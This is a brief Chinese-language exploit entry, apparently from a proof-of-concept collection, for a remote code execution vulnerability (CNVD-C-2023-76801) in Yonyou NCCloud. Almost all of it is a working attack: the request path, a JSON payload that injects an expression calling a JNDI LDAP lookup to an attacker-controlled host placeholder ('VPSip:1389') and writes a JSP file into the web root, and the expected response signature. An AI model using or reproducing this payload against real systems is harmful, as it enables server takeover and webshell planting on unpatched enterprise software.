# 用友NCCloud远程代码执行漏洞CNVD-C-2023-76801-1

用友 ｜ 命令执行 ｜ —
- **请求**：`POST /uapjs/jsinvoke/?action=invoke HTTP/1.1`

**Payload**
```
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}","webapps/nc_web/jndi.jsp"]}
```
- **响应特征**：-1